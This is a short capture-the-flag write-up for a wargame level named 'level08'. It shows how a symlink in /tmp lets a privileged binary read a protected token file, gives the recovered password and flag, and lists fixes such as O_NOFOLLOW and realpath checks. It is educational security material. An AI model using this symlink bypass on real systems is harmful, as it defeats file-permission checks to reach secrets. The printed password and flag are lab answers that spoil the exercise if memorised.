## level08

- **How we found it**

	Noticed `level08` prompts for a filename and refuses access to `~/token`:

	```bash
	./level08 token
	# You may not access 'token'
	```

- **How we exploited it**

	**1.** Create a writable symlink to the protected token file in /tmp:

	```bash
	ln -sf ~/token /tmp/test
	```

	**2.** Supply the symlink to the binary:

	```bash
	./level08 /tmp/test
	# quif5eloekouj29ke0vouxean
	```

	The output is the password for flag08.

	**3.** Switch user and retrieve the flag:

	```bash
	su flag08
	# Password: quif5eloekouj29ke0vouxean
	getflag
	# Check flag. Here is your token: 25749xKZ8L7DkSCwJkT9dyv6f
	```

- **Utility of this exercise**

Illustrates how following symbolic links in privileged programs can bypass file‑permission checks.

- **How to patch**

	- Disable following symlinks when opening files: use `open(..., O_NOFOLLOW)`.

	- Canonicalize and verify the target path (e.g., `realpath`) before opening.

	- Drop elevated privileges before handling user-supplied paths, or remove the setuid bit if unnecessary.

	- Restrict file access by checking ownership and permissions after `fstat` on the opened descriptor.